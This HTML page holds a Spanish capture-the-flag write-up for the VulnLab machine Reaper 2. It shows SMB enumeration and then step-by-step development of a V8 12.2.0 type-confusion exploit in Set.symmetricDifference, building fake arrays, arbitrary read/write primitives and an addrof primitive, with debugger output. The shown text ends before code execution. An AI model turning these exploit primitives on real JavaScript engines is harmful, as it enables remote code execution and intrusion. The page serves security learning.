<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup VulnLab Reaper 2</title>

  <meta name="description" content="Resolución de la máquina Reaper 2 de la plataforma de VulnLab">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup VulnLab Reaper 2">
  <meta name="twitter:description" content="Resolución de la máquina Reaper 2 de la plataforma de VulnLab">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/images/vulnlab/reaper2.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup VulnLab Reaper 2">
  <meta property="og:description" content="Resolución de la máquina Reaper 2 de la plataforma de VulnLab">
  <meta property="og:image" content="/images/vulnlab/reaper2.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/vulnlab/reaper2.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup VulnLab Reaper 2" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/vulnlab" title="xchg2pwn" class="blog-button">VulnLab</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">

              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>              

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#shell-www">Shell - www</a></li>
        <li><a href="#shell-system">Shell - system</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">VulnLab</h4>
    <picture><img src="/images/vulnlab/reaper2.png" style="float: right; margin-right:0px; margin-left:0px; height:80px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Reaper 2</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">445</code> que corre un servicio <code class="language-plaintext highlighter-rouge">smb</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.122.10
Nmap scan report for 10.10.122.10  
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server</span>
</code></pre></div></div><br>

<p class="plain-text">Esta abierto el puerto <code class="language-plaintext highlighter-rouge">80</code> y corre un servicio <code class="language-plaintext highlighter-rouge">http</code>, esto nos muestra una calculadora la cual parece que nos puede ayudar a resolver problemas usando el motor <code class="language-plaintext highlighter-rouge">v8</code></p>
<a href="/vulnlab/reaper2/1.png" target="_blank"><div><p><img src="/vulnlab/reaper2/1.png"></p></div></a>

<p class="plain-text">Podemos introducir código javascript y <code class="language-plaintext highlighter-rouge">v8</code> lo ejecutará mostrando el resultado, podemos probar ejecutar <code class="language-plaintext highlighter-rouge">version()</code>, esto nos revela que corre la versión <code class="language-plaintext highlighter-rouge">12.2.0</code></p>
<a href="/vulnlab/reaper2/2.png" target="_blank"><div><p><img src="/vulnlab/reaper2/2.png"></p></div></a>

<p class="plain-text">El código fuente nos muestra el comando que se utilizó para correr el script, utiliza <code class="language-plaintext highlighter-rouge">d8.exe</code> que es un interprete para <code class="language-plaintext highlighter-rouge">v8</code>, tambien podemos observar que utiliza los argumentos <code class="language-plaintext highlighter-rouge">--allow-natives-syntax --harmony-set-methods</code>, eso es interesante</p>
<a href="/vulnlab/reaper2/3.png" target="_blank"><div><p><img src="/vulnlab/reaper2/3.png"></p></div></a>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos ver que smb acepta autenticación nula, si miramos los recursos <code class="language-plaintext highlighter-rouge">smb</code> podemos ver uno llamado <code class="language-plaintext highlighter-rouge">software$</code> con privilegios de lectura</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.122.10 -u null -p </span><span class="am">'' </span><span class="p">--shares
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="az">[*] </span><span class="p">Windows Server 2022 Build 20348 x64 (name:REAPER2) (domain:Reaper2) (signing:False) (SMBv1:False)  
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="ve">[+] </span><span class="p">Reaper2\null: </span><span class="am">(Guest)</span><span class="p">
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="az">[*] </span><span class="p">Enumerated shares
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="am">Share           Permissions     Remark
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="am">-----           -----------     ------
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="am">ADMIN$                          Remote Admin
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="am">C$                              Default share
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="am">IPC$            READ            Remote IPC
</span><span class="az">SMB</span><span class="p">         10.10.122.10     445    REAPER2          </span><span class="am">software$       READ            software developement share</span>
</code></pre></div></div><br>

<p class="plain-text">Dentro del recurso encontramos 3 carpetas, la carpeta llamada <code class="language-plaintext highlighter-rouge">kernel</code> contiene un archivo <code class="language-plaintext highlighter-rouge">Reaper.sys</code> que no podemos descargar el que si podemos descargar es el <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, éste nos servirá un poco más adelante para la parte de shellcoding</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-smbclient </span><span class="p">null@10.10.122.10 -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use software$
# ls
drw-rw-rw-          0  Sun Apr 28 13:31:48 2024 .
drw-rw-rw-          0  Mon Apr 29 07:01:57 2024 ..
drw-rw-rw-          0  Sun Apr 28 06:27:22 2024 kernel
drw-rw-rw-          0  Thu May  9 13:33:23 2024 v8_debug
drw-rw-rw-          0  Sun Apr 28 06:27:09 2024 v8_release
# cd kernel
# ls
drw-rw-rw-          0  Sun Apr 28 06:27:22 2024 .
drw-rw-rw-          0  Sun Apr 28 13:31:48 2024 ..
-rw-rw-rw-     782512  Sun Apr 28 06:27:22 2024 kernel32.dll
-rw-rw-rw-       8944  Sun Apr 28 06:27:42 2024 Reaper.sys
# get Reaper.sys
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.  
#</span>
</code></pre></div></div><br>

<p class="plain-text">Las otras carpetas del recurso <code class="language-plaintext highlighter-rouge">smb</code> contienen los archivos de <code class="language-plaintext highlighter-rouge">v8</code> en la versión que corre la máquina, esto nos servirá para depurar un posible exploit localmente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p"># cd ..\v8_debug
# ls
drw-rw-rw-          0  Thu May  9 13:33:23 2024 .
drw-rw-rw-          0  Sun Apr 28 13:31:48 2024 ..
-rw-rw-rw-  132230469  Thu May  9 13:33:24 2024 v8_debug.zip
# cd ..\v8_release
# ls
drw-rw-rw-          0  Sun Apr 28 06:27:09 2024 .
drw-rw-rw-          0  Sun Apr 28 13:31:48 2024 ..
-rw-rw-rw-   24743936  Sun Apr 28 06:27:09 2024 d8.exe
-rw-rw-rw-     305782  Sun Apr 28 06:27:09 2024 snapshot_blob.bin  
#</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-www">
<br><h3 class="post-title">Shell - www</h3><br>

<p class="plain-text">Podemos encontrar el siguiente <a href="https://web.archive.org/web/20240619000007/https://h0meb0dy.me/entry/Issue-1510709-Type-confusion-in-Harmony-Set-methods-leads-to-RCE">post</a> sobre type confusion en esa versión de <code class="language-plaintext highlighter-rouge">d8</code> cuando se ejecuta con el parámetro <code class="language-plaintext highlighter-rouge">--harmony-set-methods</code>, sin embargo esta desarrollado en <code class="language-plaintext highlighter-rouge">Linux</code> asi que nuestro trabajo será hacer lo mismo en <code class="language-plaintext highlighter-rouge">Windows</code>, partiremos desde el poc para desarrollar nuestro propio exploit para la máquina, depuraremos nuestro script que se ejecutará en <code class="language-plaintext highlighter-rouge">v8</code> usaremos <code class="language-plaintext highlighter-rouge">windbg</code> para correr <code class="language-plaintext highlighter-rouge">d8.exe</code> pasandole los argumentos que conocemos y el nombre del script</p>
<a href="/vulnlab/reaper2/19.png" target="_blank"><div><p><img src="/vulnlab/reaper2/19.png"></p></div></a>

<p class="plain-text">Iniciaremos escribiendo los siguientes helpers, la primera función convierte el tipo <code class="language-plaintext highlighter-rouge">float</code> a <code class="language-plaintext highlighter-rouge">bigint</code>, el siguiente <code class="language-plaintext highlighter-rouge">bigint</code> a <code class="language-plaintext highlighter-rouge">float</code> y el ultimo <code class="language-plaintext highlighter-rouge">bigint</code> a <code class="language-plaintext highlighter-rouge">hexadecimal</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> fi_buf</span><span class="o"> = new</span><span class="na"> ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);
</span><span class="no">let</span><span class="p"> f_buf</span><span class="o"> = new</span><span class="na"> Float64Array</span><span class="p">(fi_buf);
</span><span class="no">let</span><span class="p"> i_buf</span><span class="o"> = new</span><span class="na"> BigUint64Array</span><span class="p">(fi_buf);  

</span><span class="no">function</span><span class="na"> ftoi</span><span class="p">(</span><span class="ra">f</span><span class="p">) {
    f_buf[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> f;
    </span><span class="o">return</span><span class="p"> i_buf[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">function</span><span class="na"> itof</span><span class="p">(</span><span class="ra">i</span><span class="p">) {
    i_buf[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> i;
    </span><span class="o">return</span><span class="p"> f_buf[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">function</span><span class="na"> hex</span><span class="p">(</span><span class="ra">i</span><span class="p">) {
    </span><span class="o">return</span><span class="s"> '0x'</span><span class="o"> +</span><span class="p"> i.toString(</span><span class="mi">16</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">El numero de elementos se almacena en formato <code class="language-plaintext highlighter-rouge">SMI</code> en el campo elements de la tabla, al eliminar un elemento el valor de <code class="language-plaintext highlighter-rouge">elements</code> de disminuye en <code class="language-plaintext highlighter-rouge">2</code> unidades asi que podemos ajustar la dirección del objeto eliminando elementos, sabemos que entonces podemos crear un objeto falso en una dirección inferior a la de la tabla</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> receiver</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();
</span><span class="no">let</span><span class="p"> other</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i </span><span class="o">&lt</span><span class="mi"> 16</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    receiver.add(i);
} </span><span class="c1">// elements: 16, capacity: 16</span><span class="p">

other.</span><span class="na">keys</span><span class="o"> =</span><span class="p"> () </span><span class="no">=></span><span class="p"> {
    receiver.add(</span><span class="mi">16</span><span class="p">);</span><span class="c1"> // elements: 17, capacity: 32 (grow, allocate new table)  
    </span><span class="o">return</span><span class="p"> other[</span><span class="na">Symbol</span><span class="p">.iterator]();</span><span class="c1"> // match return type (Set Iterator)</span><span class="p">
}

</span><span class="no">let</span><span class="p"> result</span><span class="o"> =</span><span class="p"> receiver.symmetricDifference(other);
</span><span class="o">%</span><span class="p">DebugPrint(result.size);

</span><span class="o">for </span><span class="p">(</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i </span><span class="o">&lt </span><span class="mi">8</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    result.delete(i);
}
</span><span class="o">%</span><span class="p">DebugPrint(result.size);</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">DebugPrint: 000001B200049949: [OrderedHashSet]  
 - FixedArray length: 83
 - elements: 17
 - deleted: 0
 - buckets: 16
 - capacity: 32

DebugPrint: 000001B200049939: [String]:</span>
</code></pre></div></div><br>

<p class="plain-text">Al crear una nueva fake array podriamos aprovechar el hecho de que las direcciones de valores como <code class="language-plaintext highlighter-rouge">PACKED_DOUBLE_ELEMENTS</code> o <code class="language-plaintext highlighter-rouge">FixedArray[0]</code> no cambian, sin embargo algo a tener en cuenta que estos valores en remoto podrian podrian ser diferentes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\user\Desktop\v8_release> </span><span class="am">.\d8.exe</span><span class="c1"> --allow-natives-syntax --harmony-set-methods</span><span class="p">  
V8 version 12.2.0 (candidate)
d8> %DebugPrint([1.1]);
DebugPrint: 0000025600049575: [JSArray]
 - map: 0x02560010ed71 &ltMap[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x02560018e6e5 &ltJSArray[0]>
 - elements: 0x025600049565 &ltFixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x0256000006cd &ltFixedArray[0]></span>
</code></pre></div></div><br>

<p class="plain-text">Si creamos una matriz falsa y un objeto falso en esa ubicación podemos escribir el valor colocando una dirección aleatoria dentro de <code class="language-plaintext highlighter-rouge">v8</code> en el campo <code class="language-plaintext highlighter-rouge">elements</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> receiver</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();
</span><span class="no">let</span><span class="p"> other</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i </span><span class="o">&lt</span><span class="mi"> 32</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    receiver.add(i);
} </span><span class="c1">// elements: 32, capacity: 32

</span><span class="no">let</span><span class="p"> fake_arr_struct;

other.</span><span class="na">keys</span><span class="o"> =</span><span class="p"> () </span><span class="no">=> </span><span class="p">{
    fake_arr_struct </span><span class="o">= </span><span class="p">[</span><span class="mi">1.1</span><span class="p">,</span><span class="mi"> 2.2</span><span class="p">];
    receiver.add(</span><span class="mi">32</span><span class="p">);</span><span class="c1"> // elements: 33, capacity: 64 (grow, allocate new table)  
    </span><span class="o">return</span><span class="p"> other[</span><span class="na">Symbol</span><span class="p">.iterator]();</span><span class="c1"> // match return type (Set Iterator)
}

</span><span class="no">let</span><span class="p"> result</span><span class="o"> =</span><span class="p"> receiver.symmetricDifference(other);

</span><span class="no">let</span><span class="p"> map</span><span class="o"> =</span><span class="mi"> 0x10ed71n</span><span class="p">;</span><span class="c1"> // PACKED_DOUBLE_ELEMENTS
</span><span class="no">let</span><span class="p"> properties </span><span class="o">= </span><span class="mi">0x6cdn</span><span class="p">;</span><span class="c1"> // FixedArray[0]
</span><span class="no">let</span><span class="p"> elements</span><span class="o"> =</span><span class="mi"> 0x41414141n</span><span class="p">;</span><span class="c1"> // arbitrary address
</span><span class="no">let</span><span class="p"> length</span><span class="o"> =</span><span class="mi"> 1n</span><span class="o"> &lt&lt </span><span class="mi">1n</span><span class="p">; </span><span class="c1">// length: 1
</span><span class="p">
fake_arr_struct[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(map</span><span class="o"> |</span><span class="p"> properties </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);
fake_arr_struct[</span><span class="mi">1</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements</span><span class="o"> |</span><span class="p"> length</span><span class="o"> &lt&lt</span><span class="mi"> 32n</span><span class="p">);

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt</span><span class="mi"> 0x10</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    result.delete(i);
}

</span><span class="no">let</span><span class="p"> fake_arr</span><span class="o"> =</span><span class="p"> result.size;
</span><span class="o">%</span><span class="p">DebugPrint(fake_arr)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">DebugPrint: 0000020000049E21: [JSArray]
 - map: 0x02000010ed71 &ltMap[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]  
 - prototype: 0x02000018e6e5 &ltJSArray[0]>
 - elements: 0x020041414141</span>
</code></pre></div></div><br>

<p class="plain-text">Si insertamos una marca en <code class="language-plaintext highlighter-rouge">fake_arr</code> como <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> luego podemos simplemente buscarlo en memoria en tiempo de ejecución y obtener su dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">function </span><span class="na">aar</span><span class="p">(</span><span class="ra">addr</span><span class="p">) {
    elements </span><span class="o">=</span><span class="p"> addr</span><span class="o"> -</span><span class="mi"> 8n</span><span class="o"> +</span><span class="mi"> 1n</span><span class="p">;
    fake_arr_struct[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements </span><span class="o">| </span><span class="p">length</span><span class="o"> &lt&lt</span><span class="mi"> 32n</span><span class="p">);
    </span><span class="o">return</span><span class="p"> fake_arr[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">function </span><span class="na">aaw</span><span class="p">(</span><span class="ra">addr</span><span class="p">,</span><span class="ra"> value</span><span class="p">) {
    elements</span><span class="o"> =</span><span class="p"> addr</span><span class="o"> -</span><span class="mi"> 8n</span><span class="o"> +</span><span class="mi"> 1n</span><span class="p">;
    fake_arr_struct[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements</span><span class="o"> |</span><span class="p"> length </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);
    fake_arr[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(value);
}

</span><span class="no">let</span><span class="p"> receiver</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();
</span><span class="no">let</span><span class="p"> other</span><span class="o"> = new</span><span class="na"> Set</span><span class="p">();

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt </span><span class="mi">32</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    receiver.add(i);
} </span><span class="c1">// elements: 32, capacity: 32

</span><span class="no">let</span><span class="p"> fake_arr_struct;

other.</span><span class="na">keys </span><span class="o">=</span><span class="p"> ()</span><span class="no"> =></span><span class="p"> {
    fake_arr_struct </span><span class="o">=</span><span class="p"> [</span><span class="mi">1.1</span><span class="p">,</span><span class="mi"> 2.2</span><span class="p">,</span><span class="mi"> 3.3</span><span class="p">];
    receiver.add(</span><span class="mi">32</span><span class="p">);</span><span class="c1"> // elements: 33, capacity: 64 (grow, allocate new table)  
    </span><span class="o">return</span><span class="p"> other[</span><span class="na">Symbol</span><span class="p">.iterator]();</span><span class="c1"> // match return type (Set Iterator)</span><span class="p">
}

</span><span class="no">let</span><span class="p"> result</span><span class="o"> =</span><span class="p"> receiver.symmetricDifference(other);

</span><span class="no">let</span><span class="p"> map</span><span class="o"> =</span><span class="mi"> 0x10ed71n</span><span class="p">;</span><span class="c1"> // PACKED_DOUBLE_ELEMENTS
</span><span class="no">let</span><span class="p"> properties</span><span class="o"> =</span><span class="mi"> 0x6cdn</span><span class="p">;</span><span class="c1"> // FixedArray[0]
</span><span class="no">let</span><span class="p"> elements</span><span class="o"> =</span><span class="mi"> 0x41414141n</span><span class="p">;</span><span class="c1"> // arbitrary address
</span><span class="no">let</span><span class="p"> length</span><span class="o"> =</span><span class="mi"> 1n</span><span class="o"> &lt&lt</span><span class="mi"> 1n</span><span class="p">; </span><span class="c1">// length: 1</span><span class="p">

fake_arr_struct[</span><span class="mi">1</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(map</span><span class="o"> |</span><span class="p"> properties </span><span class="o">&lt&lt</span><span class="mi"> 32n</span><span class="p">);
fake_arr_struct[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(elements </span><span class="o">| </span><span class="p">length</span><span class="o"> &lt&lt</span><span class="mi"> 32n</span><span class="p">);

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">;</span><span class="mi"> i</span><span class="o"> &lt</span><span class="mi"> 0x10</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    result.delete(i);
}

</span><span class="no">let</span><span class="p"> fake_arr</span><span class="o"> =</span><span class="p"> result.size;

</span><span class="no">let</span><span class="p"> marker;
</span><span class="no">let</span><span class="p"> leaked;

</span><span class="c1">/* leak address of fake_arr */</span><span class="p">
marker</span><span class="o"> =</span><span class="mi"> 0x4141414141414141n</span><span class="p">;
fake_arr_struct[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> itof(marker);

</span><span class="no">let</span><span class="p"> fake_arr_addr</span><span class="o"> =</span><span class="mi"> 0x4a000n</span><span class="p">;

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt</span><span class="mi"> 0x1000</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    leaked </span><span class="o">=</span><span class="p"> ftoi(aar(fake_arr_addr));
    </span><span class="o">if</span><span class="p"> (leaked</span><span class="o"> ==</span><span class="p"> marker) </span><span class="o">break</span><span class="p">;
    fake_arr_addr </span><span class="o">+=</span><span class="mi"> 4n</span><span class="p">;
}

fake_arr_addr</span><span class="o"> +=</span><span class="mi"> 8n</span><span class="p">;

</span><span class="na">console</span><span class="p">.</span><span class="no">log</span><span class="p">(</span><span class="s">'[+] address of fake_arr: '</span><span class="o"> +</span><span class="p"> hex(fake_arr_addr));</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">[+] address of fake_arr: 0x4a4f0
V8 version 12.2.0 (candidate)
d8> %DebugPrint(fake_arr);
DebugPrint: 000000BB0004A4F1: [JSArray]  </span>
</code></pre></div></div><br>

<p class="plain-text">Asignamos una matriz de objetos en <code class="language-plaintext highlighter-rouge">fake_arr</code> y la coloca en la matriz de objetos, la dirección puede servir como marcador para encontrar la dirección de la matriz, podemos obtenerla buscando la dirección en memoria iniciando en <code class="language-plaintext highlighter-rouge">fake_arr</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> fake_arr_struct;
</span><span class="no">let</span><span class="p"> obj_arr;

other.</span><span class="na">keys</span><span class="o"> =</span><span class="p"> ()</span><span class="no"> =></span><span class="p"> {
    fake_arr_struct </span><span class="o">= </span><span class="p">[</span><span class="mi">1.1</span><span class="p">,</span><span class="mi"> 2.2</span><span class="p">,</span><span class="mi"> 3.3</span><span class="p">];
    receiver.add(</span><span class="mi">32</span><span class="p">); </span><span class="c1">// elements: 33, capacity: 64 (grow, allocate new table)  </span><span class="p">
    obj_arr </span><span class="o">=</span><span class="p"> [{}];
    </span><span class="o">return</span><span class="p"> other[</span><span class="na">Symbol</span><span class="p">.iterator]();</span><span class="c1"> // match return type (Set Iterator)</span><span class="p">
}</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">marker </span><span class="o">=</span><span class="p"> fake_arr_addr</span><span class="o"> +</span><span class="mi"> 1n</span><span class="p">;
obj_arr[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> fake_arr;
</span><span class="no">let</span><span class="p"> obj_arr_addr</span><span class="o"> =</span><span class="p"> fake_arr_addr</span><span class="o"> +</span><span class="mi"> 0x30n</span><span class="p">;
</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt</span><span class="mi"> 0x1000</span><span class="p">; i</span><span class="o">++</span><span class="p">) {
    leaked </span><span class="o">= </span><span class="p">ftoi(aar(obj_arr_addr)) </span><span class="o">&</span><span class="mi"> 0xffffffffn</span><span class="p">;
    </span><span class="o">if</span><span class="p"> (leaked</span><span class="o"> ==</span><span class="p"> marker)</span><span class="o"> break</span><span class="p">;
    obj_arr_addr</span><span class="o"> +=</span><span class="mi"> 4n</span><span class="p">;
}

</span><span class="na">console</span><span class="p">.</span><span class="no">log</span><span class="p">(</span><span class="s">'[+] address of obj_arr[0]: '</span><span class="o"> +</span><span class="p"> hex(obj_arr_addr));  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">[+] address of obj_arr[0]: 0x4a8d8
V8 version 12.2.0 (candidate)
d8> %DebugPrint(obj_arr);
DebugPrint: 000001960004A8F9: [JSArray]
 - map: 0x01960018edf1 &ltMap[16](PACKED_ELEMENTS)> [FastProperties]  
 - prototype: 0x01960018e6e5 &ltJSArray[0]>
 - elements: 0x01960004a8d1 &ltFixedArray[1]> [PACKED_ELEMENTS]
 - length: 1</span>
</code></pre></div></div><br>

<p class="plain-text">Con la función <code class="language-plaintext highlighter-rouge">addrof</code> podemos obtener la dirección de un aleatorio insertando ese objeto aleatorio en la matriz de objetos y leyendo su valor en <code class="language-plaintext highlighter-rouge">obj_arr[0]</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">function</span><span class="na"> addrof</span><span class="p">(</span><span class="ra">obj</span><span class="p">) {
    obj_arr[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> obj;
    </span><span class="o">return</span><span class="p"> ftoi(aar(obj_arr_addr)) </span><span class="o">&</span><span class="mi"> 0xffffffffn</span><span class="p">;
}

</span><span class="no">let</span><span class="p"> tmp_obj </span><span class="o">=</span><span class="p"> {};
</span><span class="na">console</span><span class="p">.</span><span class="no">log</span><span class="p">(hex(addrof(tmp_obj)));</span>
</code></pre></div></div><br>

